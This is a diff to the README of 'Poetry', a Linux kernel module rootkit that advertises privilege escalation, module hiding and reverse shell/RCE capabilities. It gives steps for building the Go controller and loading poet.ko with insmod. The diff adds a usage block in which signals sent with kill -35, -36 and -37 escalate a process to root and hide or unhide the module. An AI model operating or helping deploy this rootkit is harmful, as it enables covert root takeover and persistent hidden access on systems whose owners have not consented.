@@ -1,6 +1,6 @@
 ![nil is goated](https://img.shields.io/badge/nil-goated-green)
 # Poetry
-This is a Linux kernel module rootkit made for >=5.13. It features privilege escalation, module hiding, and reverse shell capabilities. 
+This is a Linux kernel module rootkit made for >=5.X. It features privilege escalation, module hiding, and RCE/reverse shell capabilities. 
 
 ## Server Setup
 ### Building
@@ -22,7 +22,7 @@ go build
 
 The compiled binary will be called: `poetry`
 
-### Running
+### Usage
 Copy the compiled binary to the host system. Run the following commands to interact with the target:
 ```sh
 export IFACE=<ethernet_interface> # set interface env var
@@ -56,6 +56,13 @@ The compiled LKM will be: `poet.ko`
 ```sh
 # install the kernel module on the system
 sudo insmod poet.ko 
+```
+
+#### Privilege Escalation + Module Hiding
+```sh
+kill -35 0 # escalate to root
+kill -36 0 # hide poet module
+kill -37 0 # unhide poet module
 ```
 
 ## References
